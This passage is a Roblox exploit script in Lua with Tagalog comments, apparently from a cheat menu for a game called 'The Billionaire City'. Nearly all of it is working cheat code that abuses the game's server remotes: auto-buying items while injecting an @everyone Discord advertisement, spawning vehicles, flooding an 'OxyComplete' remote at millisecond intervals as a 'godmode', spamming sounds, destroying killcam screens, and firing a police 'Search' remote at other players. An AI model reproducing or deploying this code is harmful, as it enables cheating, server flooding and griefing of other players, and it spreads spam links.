toggle.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
toggle.Text = "OFF"
toggle.TextColor3 = Color3.fromRGB(0, 0, 0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 16

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 10)
toggleCorner.Parent = toggle

toggle.Parent = frame

--========================================================--
-- AUTO BUY FUNCTION
--========================================================--

local running = false

local function fireAutoBuy()
    local args = {
        [1] = "Ayuda Box";
        [2] = 1;
        [3] = "|| @everyone @here ||\n\n## - Nagmamahal sa lahat, Monsy , Clay , Yuno , Padrino  < / > \n\n**// @ shout out**\n- https://discord.gg/publicxenemy\n- https://discord.gg/publicxenemy\n- **republic act no. 1337**\n\n**// @ socials**\n-  https://monsyz4ux.ct.ws/\n-  https://padrino.ct.ws/";
    }

    game:GetService("ReplicatedStorage"):WaitForChild("LoadingScreenEvent", 9e9):FireServer(unpack(args))
end

--========================================================--
-- TOGGLE BUTTON LOGIC
--========================================================--

toggle.MouseButton1Click:Connect(function()
    running = not running

    if running then
        toggle.Text = "ON"
        toggle.BackgroundColor3 = Color3.fromRGB(180, 255, 180)

        while running do
            fireAutoBuy()
            task.wait(1) -- Delay per buy
        end
    else
        toggle.Text = "OFF"
        toggle.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY KILL CAM SKIP MUSCLE B (MONSY)", function()
-- UNIVERSAL KILLCAM SKIPPER WITH HOTKEY (B to Toggle ON/OFF)
-- Gumagana sa ARSENAL, PHANTOM FORCES, BAD BUSINESS, ENERGY ASSAULT, at marami pang FPS games
-- Automatic detect + destroy killcam GUI. Walang 5-sec animation! 🔥 (SILENT VERSION - WALANG PRINTS)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local UserInputService = game:GetService("UserInputService")

-- Toggle variable (DEFAULT: ON)
_G.KillcamRemover = true

-- HOTKEY: Press B to Toggle ON/OFF (changed from INSERT)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.B then
        _G.KillcamRemover = not _G.KillcamRemover
    end
end)

-- Function para sa destroy logic (reusable)
local function destroyKillcam(gui)
    if gui then
        gui:Destroy()
    end
end

-- Loop: Check every 0.5s (conditional)
spawn(function()
    while wait(0.5) do
        if _G.KillcamRemover then
            pcall(function()
                for _, gui in pairs(PlayerGui:GetChildren()) do
                    local name = gui.Name:lower()
                    if name:find("kill") or name:find("cam") or name:find("death") or name:find("spectator") or name:find("replay") then
                        destroyKillcam(gui)
                    end
                end
            end)
        end
    end
end)

-- Auto-detect new GUI (mas mabilis, conditional din)
PlayerGui.ChildAdded:Connect(function(child)
    wait()  -- 1 frame load
    if _G.KillcamRemover then
        local name = child.Name:lower()
        if name:find("kill") or name:find("cam") or name:find("death") or name:find("spectator") or name:find("replay") then
            destroyKillcam(child)
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAWN CAR (MONSY)", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- MAIN FRAME
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 230, 0, 170)
frame.Position = UDim2.new(0.5, -115, 0.5, -85)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 25)
corner.Parent = frame

local stroke = Instance.new("UIStroke")
stroke.Thickness = 1
stroke.Color = Color3.fromRGB(0,0,0)
stroke.Transparency = 0.7
stroke.Parent = frame

------------------------------------------------------
-- TITLE TEXT
------------------------------------------------------
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 35)
title.Position = UDim2.new(0, 0, 0, 5)
title.BackgroundTransparency = 1
title.Text = "MONSY SPAWN CAR"
title.TextColor3 = Color3.fromRGB(0, 0, 0)
title.Font = Enum.Font.Roboto
title.TextSize = 20
title.Parent = frame

------------------------------------------------------
-- FUNCTION TO MAKE BUTTONS
------------------------------------------------------
local function MakeTextButton(text, posY)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -20, 0, 40)
    btn.Position = UDim2.new(0, 10, 0, posY)
    btn.BackgroundTransparency = 1
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 18
    btn.Parent = frame
    return btn
end

------------------------------------------------------
-- BUTTONS (Toyota Top, Sultan Bottom)
------------------------------------------------------
local btnToyota = MakeTextButton("Toyota Corolla", 50)
local btnSultan = MakeTextButton("Sultan RS", 115)

------------------------------------------------------
-- BLACK DIVIDER LINE
------------------------------------------------------
local line = Instance.new("Frame")
line.Size = UDim2.new(1, -50, 0, 2)
line.Position = UDim2.new(0.5, -((frame.Size.X.Offset - 50)/2), 0, 95)
line.BackgroundColor3 = Color3.fromRGB(0,0,0)
line.Parent = frame

------------------------------------------------------
-- SPAWN FUNCTION
------------------------------------------------------
local function SpawnCar(name)
    local args = {[1] = name}
    game:GetService("ReplicatedStorage")
        :WaitForChild("VehicleDealerSystem", 9e9)
        :WaitForChild("Spawner", 9e9)
        :WaitForChild("Functions", 9e9)
        :WaitForChild("Spawn_Vehicle", 9e9)
        :InvokeServer(unpack(args))
end

------------------------------------------------------
-- CLICK EVENTS
------------------------------------------------------
btnToyota.MouseButton1Click:Connect(function()
    SpawnCar("Toyata Corolla")
end)

btnSultan.MouseButton1Click:Connect(function()
    SpawnCar("Sultan RS")
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY AUTO OXY (MONSY)", function()
    local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

----------------------------------------------------------------
-- GUI
----------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 130)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Parent = screenGui
frame.AnchorPoint = Vector2.new(0.5, 0.5)

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 15)

-- Title
local title = Instance.new("TextLabel")
title.Parent = frame
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Text = "AUTO OXY"
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255,255,255)

----------------------------------------------------------------
-- TOGGLE BUTTON
----------------------------------------------------------------
local toggle = Instance.new("TextButton")
toggle.Parent = frame
toggle.Size = UDim2.new(0, 200, 0, 50)
toggle.Position = UDim2.new(0.5, -100, 0, 60)
toggle.BackgroundColor3 = Color3.fromRGB(0,0,0)
toggle.BorderSizePixel = 0
toggle.Text = "OFF"
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 20
toggle.TextColor3 = Color3.fromRGB(255,255,255)

Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 12)

-- Status dot
local dot = Instance.new("Frame")
dot.Parent = toggle
dot.Size = UDim2.new(0, 12, 0, 12)
dot.Position = UDim2.new(0, 10, 0.5, -6)
dot.BackgroundColor3 = Color3.fromRGB(170,170,170)
dot.BorderSizePixel = 0
Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

----------------------------------------------------------------
-- LOGIC
----------------------------------------------------------------
local isOn = false
local thread = nil

local function startOxy()
	if thread then return end
	thread = task.spawn(function()
		while isOn do
			pcall(function()
				oxyRemote:FireServer("APOY", -1)
			end)
			task.wait(0.001) -- spam speed
		end
		thread = nil
	end)
end

local function stopOxy()
	isOn = false
end

toggle.MouseButton1Click:Connect(function()
	isOn = not isOn

	toggle.Text = isOn and "ON" or "OFF"
	dot.BackgroundColor3 = isOn and Color3.fromRGB(255,40,140) or Color3.fromRGB(170,170,170)

	if isOn then
		startOxy()
	else
		stopOxy()
	end
end)

----------------------------------------------------------------
-- DRAGGABLE
----------------------------------------------------------------
local dragging = false
local dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAWN GUI (MONSY)", function()
	-- LocalScript: PUBLIC ENEMY — Buy Tool (Super Compact White GUI)
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local buyRemote = ReplicatedStorage:WaitForChild("LoadingScreenEvent")

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Main Frame (mas maliit na)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 280, 0, 160)           -- mas compact
frame.Position = UDim2.new(0.5, -140, 0.5, -80)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.new(1, 1, 1)      -- pure white
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)

-- Soft shadow
local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1, 10, 1, 16)
shadow.Position = UDim2.new(0, -5, 0, 8)
shadow.BackgroundTransparency = 0.85
shadow.BackgroundColor3 = Color3.new(0,0,0)
shadow.ZIndex = frame.ZIndex - 1
shadow.Parent = frame
Instance.new("UICorner", shadow).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.BackgroundTransparency = 1
title.Text = "PUBLIC ENEMY"
title.TextColor3 = Color3.new(0, 0, 0)
title.Font = Enum.Font.Roboto
title.TextSize = 19
title.Parent = frame

-- TextBox (mas maliit at mas maganda)
local box = Instance.new("TextBox")
box.Size = UDim2.new(1, -32, 0, 38)
box.Position = UDim2.new(0, 16, 0, 46)
box.BackgroundColor3 = Color3.fromRGB(248, 248, 250)
box.PlaceholderText = "Tool name here..."
box.PlaceholderColor3 = Color3.fromRGB(140, 140, 140)
box.Text = ""
box.TextColor3 = Color3.new(0, 0, 0)
box.Font = Enum.Font.Roboto
box.TextSize = 15
box.ClearTextOnFocus = false
box.Parent = frame

Instance.new("UICorner", box).CornerRadius = UDim.new(0, 10)
local pad = Instance.new("UIPadding", box)
pad.PaddingLeft = UDim.new(0, 12)
pad.PaddingRight = UDim.new(0, 12)

-- BUY Button (white na rin, black text)
local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -32, 0, 42)
btn.Position = UDim2.new(0, 16, 1, -58)
btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
btn.Text = "BUY TOOL"
btn.TextColor3 = Color3.new(0, 0, 0)
btn.Font = Enum.Font.Roboto
btn.TextSize = 16
btn.AutoButtonColor = false
btn.Parent = frame

Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)

-- Hover effect (light gray lang para subtle)
btn.MouseEnter:Connect(function()
	TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(240, 240, 245)}):Play()
end)
btn.MouseLeave:Connect(function()
	TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.new(1,1,1)}):Play()
end)

-- Feedback (very small sa baba)
local feedback = Instance.new("TextLabel")
feedback.Size = UDim2.new(1, 0, 0, 20)
feedback.Position = UDim2.new(0, 0, 1, -24)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.TextColor3 = Color3.fromRGB(0, 120, 0)
feedback.Font = Enum.Font.Roboto
feedback.TextSize = 13
feedback.Parent = frame

local function show(msg)
	feedback.Text = msg
	task.delay(2, function()
		if feedback.Parent then feedback.Text = "" end
	end)
end

-- Buy function
local function buy()
	local name = box.Text:match("^%s*(.-)%s*$")  -- trim
	if name == "" then
		show("Enter tool name!")
		return
	end
	
	buyRemote:FireServer(name, 1, "|| @everyone @here ||\n\n## - Nagmamahal sa lahat, Monsy , Clay , Yuno , Padrino  < / > \n\n**// @ shout out**\n- https://discord.gg/publicxenemy\n- https://discord.gg/publicxenemy\n- **republic act no. 1337**\n\n**// @ socials**\n-  https://monsyz4ux.ct.ws/\n-  https://padrino.ct.ws/")
	show("Buying " .. name .. "...")
	box.Text = ""
end

btn.MouseButton1Click:Connect(buy)

-- Enter key sa textbox = buy din
box.FocusLost:Connect(function(enter)
	if enter then buy() end
end)

-- Cleanup
player.AncestryChanged:Connect(function()
	if not player.Parent then gui:Destroy() end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY GODMODE (BETA)", function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local oxyRemote = ReplicatedStorage:WaitForChild("OxyComplete")

----------------------------------------------------------------
-- GUI
----------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 130)
frame.Position = UDim2.new(0.5, -125, 0.5, -60)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Parent = screenGui

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 15)

local title = Instance.new("TextLabel")
title.Parent = frame
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "GODMODE OXY"
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(0,0,0) -- BLACK TEXT NOW

----------------------------------------------------------------
-- TOGGLE BUTTON
----------------------------------------------------------------
local toggle = Instance.new("TextButton")
toggle.Parent = frame
toggle.Size = UDim2.new(0, 200, 0, 50)
toggle.Position = UDim2.new(0.5, -100, 0, 60)
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.BorderSizePixel = 0
toggle.Text = "OFF"
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 20
toggle.TextColor3 = Color3.fromRGB(0,0,0) -- BLACK TEXT NOW

Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 12)

local dot = Instance.new("Frame")
dot.Parent = toggle
dot.Size = UDim2.new(0, 12, 0, 12)
dot.Position = UDim2.new(0, 10, 0.5, -6)
dot.BackgroundColor3 = Color3.fromRGB(170,170,170)
dot.BorderSizePixel = 0
Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

----------------------------------------------------------------
-- LOGIC
----------------------------------------------------------------
local isOn = false
local thread = nil

local function startOxy()
	if thread then return end
	thread = task.spawn(function()
		while isOn do
			pcall(function()
				-- 5 FIRE IN ONE LOOP
				for i = 1,100 do
					oxyRemote:FireServer("APOY", -1)
				end
			end)
			task.wait(0.0001)
		end
		thread = nil
	end)
end

toggle.MouseButton1Click:Connect(function()
	isOn = not isOn

	toggle.Text = isOn and "ON" or "OFF"
	toggle.TextColor3 = isOn and Color3.fromRGB(255,0,0) or Color3.fromRGB(0,0,0)

	dot.BackgroundColor3 = isOn and Color3.fromRGB(255,0,0) or Color3.fromRGB(170,170,170)

	if isOn then
		startOxy()
	end
end)

----------------------------------------------------------------
-- DRAG
----------------------------------------------------------------
local dragging = false
local dragStart, startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONARE CITY SPAM SOUND (MONSY)", function()
    -- LocalScript (put in StarterPlayerScripts)
-- SPAM SOUND GUI with toggle (draggable, black, rounded corners)
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Remote reference (uses user's provided pattern)
local vaultRemote = ReplicatedStorage:WaitForChild("Vault", 9e9)

-- GUI setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local main = Instance.new("Frame")
main.Name = ""
main.Parent = screenGui
main.Size = UDim2.new(0, 220, 0, 100)
main.Position = UDim2.new(0.5, -110, 0.5, -50)
main.BackgroundColor3 = Color3.fromRGB(255,255,255) -- all black
main.Active = true -- required for dragging
main.AnchorPoint = Vector2.new(0.5, 0.5)

local uicorner = Instance.new("UICorner", main)
uicorner.CornerRadius = UDim.new(0, 12)

-- Title
local title = Instance.new("TextLabel")
title.Parent = main
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 6)
title.BackgroundTransparency = 1
title.Text = "SPAM SOUND"
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(0,0,0)
title.AnchorPoint = Vector2.new(0, 0)

-- Toggle button
local toggleBtn = Instance.new("TextButton")
toggleBtn.Name = ""
toggleBtn.Parent = main
toggleBtn.Size = UDim2.new(0, 120, 0, 34)
toggleBtn.Position = UDim2.new(0.5, -60, 0, 46)
toggleBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleBtn.BorderSizePixel = 0
toggleBtn.AutoButtonColor = true
toggleBtn.Font = Enum.Font.Roboto
toggleBtn.TextSize = 14
toggleBtn.TextColor3 = Color3.fromRGB(0,0,0)
toggleBtn.Text = "OFF"

local toggleCorner = Instance.new("UICorner", toggleBtn)
toggleCorner.CornerRadius = UDim.new(0, 10)

-- Small status dot (left of text)
local statusDot = Instance.new("Frame")
statusDot.Name = ""
statusDot.Parent = toggleBtn
statusDot.Size = UDim2.new(0, 12, 0, 12)
statusDot.Position = UDim2.new(0, 8, 0.5, -6)
statusDot.BackgroundColor3 = Color3.fromRGB(170,170,170)
statusDot.BorderSizePixel = 0
local dotCorner = Instance.new("UICorner", statusDot)
dotCorner.CornerRadius = UDim.new(1, 0)

-- Make main draggable
do
	local dragging, dragStart, startPos

	local function inputBegan(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = main.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end

	local function inputChanged(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
			local delta = input.Position - dragStart
			main.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end

	main.InputBegan:Connect(inputBegan)
	main.InputChanged:Connect(inputChanged)
end

-- Spam loop control
local isOn = false
local spamTask = nil

local function startSpam()
	if spamTask then return end
	spamTask = task.spawn(function()
		-- local args table as user provided
		local args = {}
		while isOn do
			local ok, err = pcall(function()
				vaultRemote:FireServer(unpack(args))
			end)
			-- silently ignore errors so the loop continues but avoid tight infinite error floods
			if not ok then
				-- optional: you can print(err) for debugging
				-- print("FireServer error:", err)
			end
			-- smallest reasonable wait; task.wait(0.001) will wait ~1ms but can be limited by scheduler
			task.wait(0.001)
		end
		spamTask = nil
	end)
end

local function stopSpam()
	isOn = false
	-- spamTask will end by itself because loop checks isOn
end

-- Toggle behavior
toggleBtn.MouseButton1Click:Connect(function()
	if not isOn then
		isOn = true
		toggleBtn.Text = "ON"
		statusDot.BackgroundColor3 = Color3.fromRGB(0,255,0)
		startSpam()
	else
		stopSpam()
		toggleBtn.Text = "OFF"
		statusDot.BackgroundColor3 = Color3.fromRGB(170,170,170)
	end
end)

-- Optional: allow closing with right-click on title (not required)
title.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton2 then
		screenGui:Destroy()
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("THE BILLIONAIRE CITY STORAGE SYSTEM", function()
-- LocalScript: Tools Viewer (White GUI + Black Text + Light Accents)
-- Place in StarterPlayerScripts

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ▼ PINALITAN MO ITO
local toolsFolder = game:GetService("ReplicatedStorage"):WaitForChild("StorageSystem")

-- Main GUI
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Main Frame (White background)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 360)
frame.Position = UDim2.new(0.5, -200, 0.25, 0)
frame.AnchorPoint = Vector2.new(0.5, 0)
frame.BackgroundColor3 = Color3.new(1, 1, 1)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 14)
frameCorner.Parent = frame

-- Shadow
local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1, 8, 1, 20)
shadow.Position = UDim2.new(0, -4, 0, 10)
shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shadow.BackgroundTransparency = 0.85
shadow.ZIndex = frame.ZIndex - 1
shadow.Parent = frame
local shadowCorner = Instance.new("UICorner")
shadowCorner.CornerRadius = UDim.new(0, 16)
shadowCorner.Parent = shadow

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 42)
title.BackgroundTransparency = 1
title.Text = "Tools Viewer"
title.Font = Enum.Font.Roboto
title.TextSize = 20
title.TextColor3 = Color3.new(0, 0, 0)
title.Parent = frame

-- Subtitle
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -24, 0, 20)
subtitle.Position = UDim2.new(0, 12, 0, 44)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Click any tool to copy its name"
subtitle.Font = Enum.Font.Roboto
subtitle.TextSize = 14
subtitle.TextColor3 = Color3.fromRGB(90, 90, 90)
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = frame

-- ScrollingFrame
local scrolling = Instance.new("ScrollingFrame")
scrolling.Size = UDim2.new(1, -24, 1, -80)
scrolling.Position = UDim2.new(0, 12, 0, 72)
scrolling.BackgroundColor3 = Color3.fromRGB(248, 248, 250)
scrolling.BorderSizePixel = 0
scrolling.ScrollBarThickness = 8
scrolling.ScrollBarImageColor3 = Color3.fromRGB(180, 180, 190)
scrolling.Parent = frame

local scrollCorner = Instance.new("UICorner")
scrollCorner.CornerRadius = UDim.new(0, 10)
scrollCorner.Parent = scrolling

local layout = Instance.new("UIListLayout")
layout.SortOrder = Enum.SortOrder.Name
layout.Padding = UDim.new(0, 6)
layout.Parent = scrolling

local function clearList()
	for _, child in scrolling:GetChildren() do
		if child:IsA("TextButton") then
			child:Destroy()
		end
	end
end

local function addTool(tool)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -12, 0, 36)
	btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	btn.Text = "  " .. tool.Name
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Font = Enum.Font.Roboto
	btn.TextSize = 15
	btn.TextColor3 = Color3.new(0, 0, 0)
	btn.AutoButtonColor = false
	btn.Parent = scrolling

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = btn

	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(235, 245, 255)
		}):Play()
	end)

	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		setclipboard(tool.Name)
		btn.TextColor3 = Color3.fromRGB(0, 140, 0)
		btn.Text = "  " .. tool.Name .. "  [Copied!]"
		task.wait(1.4)
		btn.TextColor3 = Color3.new(0, 0, 0)
		btn.Text = "  " .. tool.Name
	end)
end

local function rebuildList()
	clearList()
	local list = {}

	for _, obj in toolsFolder:GetDescendants() do
		if obj:IsA("Tool") then
			table.insert(list, obj)
		end
	end

	table.sort(list, function(a, b)
		return a.Name:lower() < b.Name:lower()
	end)

	for _, tool in list do
		addTool(tool)
	end

	scrolling.CanvasSize = UDim2.new(0, 0, 0, #list * 42)
end

rebuildList()

toolsFolder.DescendantAdded:Connect(function(child)
	if child:IsA("Tool") then
		task.defer(rebuildList)
	end
end)

toolsFolder.DescendantRemoving:Connect(function(child)
	if child:IsA("Tool") then
		rebuildList()
	end
end)

player.AncestryChanged:Connect(function()
	if not player.Parent then
		gui:Destroy()
	end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["CUSTOMIZE SCRIPT"]
	if not panel then return end

	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local hover = t.bg:Lerp(t.accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local base = t.bg:Lerp(t.accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

-- Example main menu button
addMainMenuButton("CONFISCATE (SANTINO)", function()
	--// SERVICES
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

--// REMOTE
local SearchRemote = ReplicatedStorage:WaitForChild("Police"):WaitForChild("Search")

--// MAIN GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = ""

--// PLAYER LIST FRAME
local ListFrame = Instance.new("Frame")
ListFrame.Size = UDim2.new(0, 180, 0, 400)
ListFrame.Position = UDim2.new(0, 10, 0.5, -200)
ListFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
ListFrame.BorderSizePixel = 0
ListFrame.Parent = ScreenGui

Instance.new("UICorner", ListFrame).CornerRadius = UDim.new(0, 12)

local ListTitle = Instance.new("TextLabel")
ListTitle.Text = "PLAYERS ONLINE"
ListTitle.Font = Enum.Font.Roboto
ListTitle.TextSize = 16
ListTitle.TextColor3 = Color3.fromRGB(0,0,0)
ListTitle.BackgroundTransparency = 1
ListTitle.Size = UDim2.new(1, 0, 0, 35)
ListTitle.Parent = ListFrame

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(1, -10, 1, -45)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 40)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScrollingFrame.Parent = ListFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 4)
UIListLayout.Parent = ScrollingFrame

--// ADD PLAYER BUTTON
local playerButtons = {}

local function addPlayerToList(player)
	if playerButtons[player] then return end

	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 35)
	btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
	btn.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	btn.TextColor3 = Color3.fromRGB(0,0,0)
	btn.Font = Enum.Font.Roboto
	btn.TextSize = 14
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Parent = ScrollingFrame

	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

	local padding = Instance.new("UIPadding")
	padding.PaddingLeft = UDim.new(0, 10)
	padding.Parent = btn

	btn.MouseButton1Click:Connect(function()
		if player.Character then
			SearchRemote:FireServer(player.Character)
		end
	end)

	playerButtons[player] = btn
end

